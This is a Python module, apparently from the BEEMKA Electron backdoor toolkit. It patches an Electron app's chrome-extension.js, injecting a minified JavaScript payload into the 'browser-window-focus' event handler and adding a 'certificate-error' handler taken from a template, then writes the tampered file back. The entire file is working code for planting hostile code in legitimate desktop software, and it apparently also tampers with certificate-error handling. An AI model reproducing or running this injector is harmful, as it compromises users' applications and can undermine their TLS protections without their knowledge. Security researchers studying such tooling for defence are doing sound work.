import pprint, os, jsmin

class worker:
    def __init__(self, utils):
        self.utils = utils

    def run(self, worker_data):
        module = worker_data['module']
        module_data = worker_data['module_data']
        asar_working_path = worker_data['asar_working_path']

        # First we need to generate the JS variables that we will inject into the base.js script.
        js_variables = "\n".join(self.utils.generate_js_variable(module_data))

        file_to_inject = os.path.join(asar_working_path, 'browser', 'chrome-extension.js')
        if os.path.isfile(file_to_inject) is False:
            return False

        file_contents = self.utils.load_file(file_to_inject)

        # Get the JavaScript payload.
        js_payload = self.utils.load_file(os.path.join(module['path'], 'templates', 'code.js'))
        js_payload = js_payload.replace("%BEEMKA_VARIABLE_PLACEHOLDER%", js_variables)
        js_payload = jsmin.jsmin(js_payload).replace('"', '\\"').replace("\n", "").replace("\r", "")

        # Get the event payload.
        browser_payload = self.utils.load_file(os.path.join(module['path'], 'templates', 'browser-window-focus.js'))

        browser_param = 'bWindow'
        if self.utils.event_exists(file_contents, 'app.on', 'browser-window-focus'):
            # We need to get the name of the 'browser' variable.
            function_definition = self.utils.get_function_definition(file_contents, 'app.on', 'browser-window-focus')
            browser_param = self.utils.get_function_positional_argument(function_definition, 2)

        browser_payload = browser_payload.replace('%BROWSER_WINDOW%', browser_param)

        payload = browser_payload.replace('%PAYLOAD%', js_payload)

        file_contents = self.utils.inject_code(file_contents, 'app.on', 'browser-window-focus', payload, "app.on('browser-window-focus', function (event, bWindow) {\n\n%FUNCTION_CODE%\n\n});")

        certificate_payload = self.utils.load_file(os.path.join(module['path'], 'templates', 'certificate-error.js'))
        file_contents = self.utils.inject_code(file_contents, 'app.on', 'certificate-error', certificate_payload, "app.on('certificate-error', (event, webContents, url, error, certificate, callback) => { %FUNCTION_CODE% });")

        with open(file_to_inject, 'w') as f:
            f.write(file_contents)

        return True